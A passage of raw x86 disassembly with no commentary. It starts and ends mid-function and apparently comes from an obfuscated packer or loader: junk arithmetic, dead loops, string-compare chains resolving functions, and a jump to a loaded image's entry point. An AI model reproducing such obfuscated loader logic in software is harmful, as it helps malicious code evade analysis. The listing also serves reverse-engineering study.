  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x42fa24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x42fa28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af21
  41c85f:	mov    eax,ds:0x42af2d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427df1
  41d28a:	mov    ecx,DWORD PTR ds:0x429eb5
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x42fa2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x42fa38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
